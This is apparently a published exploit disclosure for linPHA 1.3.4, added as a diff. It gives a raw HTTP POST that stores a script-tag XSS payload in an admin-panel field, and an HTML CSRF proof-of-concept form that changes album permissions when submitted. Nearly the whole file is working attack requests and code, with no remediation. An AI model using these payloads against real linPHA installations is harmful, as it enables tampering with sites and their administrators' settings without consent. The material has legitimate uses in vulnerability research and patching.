@@ -1,0 +1,48 @@
+# Exploit Title: linPHA 1.3.4 - Pemanent XSS and CSRF
+# Date: 28/01/2014
+# Exploit Author: killall-9@mail.com
+# Vendor Homepage: http://sourceforge.net/projects/linpha/
+# Software Link: http://sourceforge.net/projects/linpha/files/latest/download
+# Version: 1.3.4
+# Tested on: Virtualbox (debian) and Apache
+
+===[ Exploit ]===
+
+1) Permanent XSS=>
+.....
+POST /linpha-1.3.4/actions/submit_mod_data.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/linpha-1.3.4/admin.php?page=mysettings
+Cookie: PHPSESSID=bbdjarqpmknfpubtnc29rgodu0
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 153
+
+friend_user_name=admin&friend_full_name=%3Cscript%3Ealert%28%22xss+here%22%29%3B%3C%2Fscript%3E&friend_user_mail=admin%40gmail.com&id=1&action=frienduser
+.....
+
+
+2) CSRF (poc)=>
+.....
+<html>
+<head>
+<title>Pinata-CSRF-Tool</title>
+</head>
+<body>
+<form action="http://localhost/linpha-1.3.4/admin.php?page=perms&edit=basket_mail&redirector=general" id="formid" method="post">
+<input name="who" value="2" />
+<input name="and_or" value="0" />
+<input name="alb" value="0" />
+<input name="change_permissions" value="true" />
+<input type="submit" value="Invia"/>
+</form>
+</body>
+</html>
+.....
+
+These vulnerabilities was found in the administration panel.
+cheerZ.:
